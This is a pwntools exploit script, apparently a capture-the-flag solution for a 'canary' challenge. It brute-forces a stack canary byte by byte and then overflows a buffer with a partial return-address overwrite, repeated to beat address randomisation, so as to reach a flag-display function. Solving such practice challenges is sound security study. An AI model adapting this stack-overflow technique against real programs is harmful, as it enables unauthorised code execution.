#!/usr/bin/env python3

from pwn import *

#exe = ELF("/problems/canary_0_2aa953036679658ee5e0cc3e373aa8e0/vuln") on the server
exe = ELF("./vuln")

context.binary = exe

def main():
	padding1 = "a"*32
	padding2 = "a"*16
	display_flag_addr = "\xed\x07" #Only input half the address bc it gets randomized grrrrr
	canary = ''
	# Brute forcing the canary
	for i in range(1,5):
		for j in range(256):
			r = process([exe.path])
			r.recvuntil("Please enter the length of the entry:\n>")
			r.sendline(str(32+i))
			r.recvuntil("Input> ")
			r.sendline(padding1 + canary + chr(j))
			result = str(r.recvall())
			if not("Smashing" in result):
				canary += chr(j)
				print("Canary byte found!")
				break
	print("Sauce: " + canary) #On server: 33xO
	for i in range(100): #We have to run this multiple times bc addrs randomized. We are going to try until our half bytes match up to the randomized display_flag addr.
		r = process([exe.path])
		r.recvuntil("Please enter the length of the entry:\n>")
		r.sendline("54") # Length of payload
		r.recvuntil("Input> ")
		r.sendline(padding1 + canary + padding2 + display_flag_addr)

if __name__ == "__main__":
	main()
